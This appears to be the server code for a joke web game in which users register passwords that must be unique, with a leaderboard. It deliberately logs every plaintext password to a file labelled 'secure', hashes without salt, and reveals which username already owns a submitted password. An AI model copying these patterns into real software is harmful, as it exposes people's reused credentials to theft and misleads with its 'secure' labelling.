const express = require('express');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const fs = require('fs').promises;
const path = require('path');
const app = express();

// Environment variables with defaults
const port = process.env.PORT || 3000;
const DB_PATH = process.env.DB_PATH || './meme.db';
const SECURE_LOG_PATH = path.join(__dirname, 'secure', 'password_log.json');

// Success messages for returning users
const SUCCESS_MESSAGES = [
    "Smart thinking! Another unique password! 🧠",
    "You're on a roll! Keep them coming! 🎲",
    "Brilliant choice! Added to your collection! ✨",
    "Another masterpiece! You're crushing it! 💫",
    "Level up! Your password game is strong! 🎮"
];

// Security headers middleware
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    next();
});

// Regular middleware
app.use(express.json());
app.use(express.static('public'));

// CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.header('Access-Control-Allow-Methods', 'GET, POST');
    next();
});

// Utility functions
function hasExcessiveConsecutiveNumbers(str) {
    const chars = str.split('');
    let consecutiveCount = 0;
    let lastChar = '';

    for (const char of chars) {
        if (/[0-9]/.test(char)) {
            if (/[0-9]/.test(lastChar)) {
                consecutiveCount++;
                if (consecutiveCount >= 11) {
                    return true;
                }
            } else {
                consecutiveCount = 1;
            }
        } else {
            consecutiveCount = 0;
        }
        lastChar = char;
    }
    return false;
}

// Database setup
let db;
try {
    db = new sqlite3.Database(DB_PATH, (err) => {
        if (err) {
            console.error('Fatal database error:', err.message);
            process.exit(1);
        }
        console.log('Connected to database successfully');
        
        // Ensure table exists with proper indices
        db.serialize(() => {
            db.run(`CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password_hash TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )`);
            
            // Add indices for better performance
            db.run(`CREATE INDEX IF NOT EXISTS idx_password_hash ON users(password_hash)`);
            db.run(`CREATE INDEX IF NOT EXISTS idx_username ON users(username)`);
        });
    });
} catch (error) {
    console.error('Database initialization failed:', error);
    process.exit(1);
}

// Ensure secure directory exists
async function ensureSecureDir() {
    try {
        await fs.mkdir(path.join(__dirname, 'secure'), { recursive: true });
        try {
            await fs.access(SECURE_LOG_PATH);
        } catch {
            await fs.writeFile(SECURE_LOG_PATH, JSON.stringify([], null, 2));
        }
    } catch (error) {
        console.error('Error setting up secure directory:', error);
    }
}

// Initialize secure directory
ensureSecureDir();

// Secure logging function
async function logPasswordEntry(username, password, hash) {
    try {
        const currentData = await fs.readFile(SECURE_LOG_PATH, 'utf8');
        const entries = JSON.parse(currentData);
        
        entries.push({
            timestamp: new Date().toISOString(),
            username,
            password,
            hash,
        });

        await fs.writeFile(SECURE_LOG_PATH, JSON.stringify(entries, null, 2));
    } catch (error) {
        console.error('Error logging password:', error);
    }
}

// Registration endpoint
app.post('/register', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // Input validation
        if (!username?.trim() || !password?.trim()) {
            return res.status(400).json({ 
                success: false, 
                message: "Username and password are required! 🤔" 
            });
        }

        // Check for excessive consecutive numbers
        if (hasExcessiveConsecutiveNumbers(password)) {
            return res.status(400).json({
                success: false,
                message: "Whoa there! That's too many numbers in a row 🔢"
            });
        }

        const normalizedUsername = username.trim().toLowerCase();
        const trimmedUsername = username.trim();

        if (normalizedUsername.length > 50) {
            return res.status(400).json({
                success: false,
                message: "Username too long! Keep it under 50 characters 📏"
            });
        }

        const passwordHash = crypto.createHash('sha256').update(password).digest('hex');

        // First check if this user has any existing passwords
        const userExists = await new Promise((resolve, reject) => {
            db.get('SELECT COUNT(*) as count FROM users WHERE LOWER(username) = ?', 
                [normalizedUsername], 
                (err, row) => {
                    if (err) reject(err);
                    resolve(row?.count > 0);
                }
            );
        });

        // Then check for duplicate password
        const existingPassword = await new Promise((resolve, reject) => {
            db.get('SELECT username FROM users WHERE password_hash = ?', 
                [passwordHash], 
                (err, row) => {
                    if (err) reject(err);
                    resolve(row);
                }
            );
        });

        if (existingPassword) {
            // Check if it's the same user trying the same password
            if (existingPassword.username.toLowerCase() === normalizedUsername) {
                return res.json({
                    success: false,
                    message: "You've already tried that password 😪"
                });
            } else {
                return res.json({
                    success: false,
                    message: `This password is already taken by "${existingPassword.username}" 😭`
                });
            }
        }

        // Insert new user
        await new Promise((resolve, reject) => {
            db.run('INSERT INTO users (username, password_hash) VALUES (?, ?)', 
                [trimmedUsername, passwordHash], 
                (err) => {
                    if (err) reject(err);
                    resolve();
                }
            );
        });

        // Log the entry securely
        await logPasswordEntry(trimmedUsername, password, passwordHash);

        // Choose success message based on whether user is new or returning
        const successMessage = userExists 
            ? SUCCESS_MESSAGES[Math.floor(Math.random() * SUCCESS_MESSAGES.length)]
            : "Welcome to the club! 🎉";

        res.json({ 
            success: true,
            message: successMessage
        });

    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ 
            success: false, 
            message: "Server had a hiccup! Try again later 🤒" 
        });
    }
});

// Leaderboard endpoint with caching
let leaderboardCache = null;
let lastCacheTime = 0;
const CACHE_DURATION = 60 * 1000; // 1 minute

app.get('/leaderboard', async (req, res) => {
  try {
    // Return cached data if available and fresh
    if (leaderboardCache && (Date.now() - lastCacheTime) < CACHE_DURATION) {
      return res.json(leaderboardCache);
    }

    const leaders = await new Promise((resolve, reject) => {
      db.all(`
        SELECT username, COUNT(*) as count 
        FROM users 
        GROUP BY username 
        ORDER BY count DESC 
        LIMIT 10
      `, (err, rows) => {
        if (err) reject(err);
        resolve(rows);
      });
    });

    // Update cache
    leaderboardCache = leaders;
    lastCacheTime = Date.now();

    res.json(leaders);

  } catch (error) {
    console.error('Leaderboard error:', error);
    res.status(500).json({ 
      success: false, 
      message: "Couldn't fetch leaderboard right now 📊❌" 
    });
  }
});

// Graceful shutdown handling
const gracefulShutdown = () => {
    console.log('Received shutdown signal. Closing connections...');
    
    db.close((err) => {
        if (err) {
            console.error('Error closing database:', err);
            process.exit(1);
        }
        console.log('Database connection closed.');
        
        server.close(() => {
            console.log('HTTP server closed.');
            process.exit(0);
        });
    });
};

process.on('SIGTERM', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);

// Start server
const server = app.listen(port, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${port}`);
});